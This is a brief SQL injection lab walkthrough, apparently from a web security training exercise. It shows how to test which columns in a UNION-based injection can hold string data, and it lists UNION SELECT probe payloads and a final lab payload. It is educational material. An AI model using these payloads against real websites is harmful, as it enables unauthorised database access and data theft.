Generally, the interesting data that you want to retrieve will be in string form. Having already determined the number of required columns, you can probe each column to test whether it can hold string data by replacing one of the UNION SELECT payloads with a string value. In previous lab you would submit:

        ' UNION SELECT 'a',NULL,NULL--
        ' UNION SELECT NULL,'a',NULL--
        ' UNION SELECT NULL,NULL,'a'--
        
Payload
```sql
' UNION SELECT NULL,'Tz0F22',NULL--
```
        
        
